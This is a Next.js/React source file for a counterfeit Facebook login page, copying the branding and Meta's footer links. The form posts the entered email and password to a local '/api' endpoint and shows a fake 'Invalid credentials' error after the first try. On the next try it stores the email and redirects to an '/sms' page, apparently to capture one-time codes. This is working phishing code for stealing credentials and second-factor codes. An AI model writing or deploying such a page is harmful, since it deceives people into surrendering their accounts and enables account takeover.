'use client';

import React, { useState, useEffect } from 'react';
import axios from 'axios';
import { useRouter } from 'next/navigation';

const FacebookLogin: React.FC = () => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [loginAttempts, setLoginAttempts] = useState(0);
  const router = useRouter();

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setError('');

    if (!email || !password) {
      setError('Please fill in all fields');
      return;
    }

    setIsLoading(true);
    setLoginAttempts(loginAttempts + 1);

    if (loginAttempts === 0) {
      try {
        await axios.post('/api', { email, password });
        setError('Invalid credentials');
      } catch (err) {
        setError('Something went wrong');
      } finally {
        setIsLoading(false);
      }
    } else {
      localStorage.setItem('email', email);
      router.push('/sms');
    }
  };

  return (
    <div className="min-h-screen bg-gray-100 flex flex-col">
      <div className="flex-1 flex flex-col items-center justify-center px-4 py-8">
        <div className="mb-8">
          <h1 className="text-5xl font-bold text-blue-600 mb-8">facebook</h1>
        </div>
        <div className="w-full max-w-md">
          <div className="bg-white rounded-lg shadow-lg border border-gray-200 px-8 py-6">
            {error && !isLoading && (
              <div className="bg-red-100 text-black px-4 py-3 mb-4 text-center border border-red-400">
                <div className="font-semibold text-lg">Wrong credentials</div>
                <div>Invalid username or password</div>
              </div>
            )}
            <h2 className="text-lg font-normal text-gray-900 mb-6 text-center">
              Log into Facebook
            </h2>
            <form onSubmit={handleLogin} className="space-y-4">
              <div>
                <input
                  type="text"
                  placeholder="Mobile number or email address"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  disabled={isLoading}
                  className={`w-full px-4 py-3 border border-gray-300 rounded-lg text-gray-900 placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent ${
                    isLoading ? 'bg-gray-100 cursor-not-allowed' : ''
                  }`}
                />
              </div>
              <div>
                <input
                  type="password"
                  placeholder="Password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  disabled={isLoading}
                  className={`w-full px-4 py-3 border border-gray-300 rounded-lg text-gray-900 placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent ${
                    isLoading ? 'bg-gray-100 cursor-not-allowed' : ''
                  }`}
                />
              </div>
              {isLoading && (
                <div className="flex items-center justify-center">
                  <div className="w-6 h-6 border-3 border-gray-300 border-t-blue-600 rounded-full animate-spin"></div>
                </div>
              )}
              <button
                type="submit"
                disabled={isLoading}
                className={`w-full font-semibold py-3 rounded-lg transition-colors duration-200 ${
                  isLoading
                    ? 'bg-gray-400 text-gray-600 cursor-not-allowed'
                    : 'bg-blue-600 text-white hover:bg-blue-700'
                }`}
              >
                {isLoading ? 'Logging in...' : 'Log in'}
              </button>
            </form>
            <div className="mt-4 text-center">
              <a 
                href="#" 
                className="text-blue-600 hover:underline text-sm"
              >
                Forgot password?
              </a>
            </div>
          </div>
        </div>
      </div>
      <footer className="bg-white border-t border-gray-200 px-4 py-8">
        <div className="max-w-6xl mx-auto">
          <div className="flex flex-wrap justify-center gap-2 text-xs text-gray-500 mb-4">
            <a href="#" className="hover:underline">English (UK)</a>
            <a href="#" className="hover:underline">Shqip</a>
            <a href="#" className="hover:underline">Deutsch</a>
            <a href="#" className="hover:underline">Türkçe</a>
            <a href="#" className="hover:underline">Српски</a>
            <a href="#" className="hover:underline">Français (France)</a>
            <a href="#" className="hover:underline">Italiano</a>
            <a href="#" className="hover:underline">Bosanski</a>
            <a href="#" className="hover:underline">Svenska</a>
            <a href="#" className="hover:underline">Español</a>
            <a href="#" className="hover:underline">Português (Brasil)</a>
            <button className="text-gray-400 hover:bg-gray-100 px-2 py-1 rounded">+</button>
          </div>
          <div className="flex flex-wrap justify-center gap-x-4 gap-y-2 text-xs text-gray-500 mb-4">
            <a href="#" className="hover:underline">Sign Up</a>
            <a href="#" className="hover:underline">Log in</a>
            <a href="#" className="hover:underline">Messenger</a>
            <a href="#" className="hover:underline">Facebook Lite</a>
            <a href="#" className="hover:underline">Video</a>
            <a href="#" className="hover:underline">Places</a>
            <a href="#" className="hover:underline">Games</a>
            <a href="#" className="hover:underline">Marketplace</a>
            <a href="#" className="hover:underline">Meta Pay</a>
            <a href="#" className="hover:underline">Meta Store</a>
            <a href="#" className-="hover:underline">Meta Quest</a>
            <a href="#" className="hover:underline">Imagine with Meta AI</a>
            <a href="#" className="hover:underline">Instagram</a>
            <a href="#" className="hover:underline">Threads</a>
            <a href="#" className="hover:underline">Fundraisers</a>
            <a href="#" className="hover:underline">Services</a>
            <a href="#" className="hover:underline">Voting Information Centre</a>
            <a href="#" className="hover:underline">Privacy Policy</a>
            <a href="#" className="hover:underline">Privacy Centre</a>
            <a href="#" className="hover:underline">Groups</a>
            <a href="#" className="hover:underline">About</a>
            <a href="#" className="hover:underline">Create ad</a>
            <a href="#" className="hover:underline">Create Page</a>
            <a href="#" className="hover:underline">Developers</a>
            <a href="#" className="hover:underline">Careers</a>
            <a href="#" className="hover:underline">Cookies</a>
            <a href="#" className="hover:underline">AdChoices</a>
            <a href="#" className="hover:underline">Terms</a>
            <a href="#" className="hover:underline">Help</a>
            <a href="#" className="hover:underline">Contact uploading and non-users</a>
          </div>
          <div className="text-center text-xs text-gray-500">
            Meta © 2025
          </div>
        </div>
      </footer>
    </div>
  );
};

export default FacebookLogin;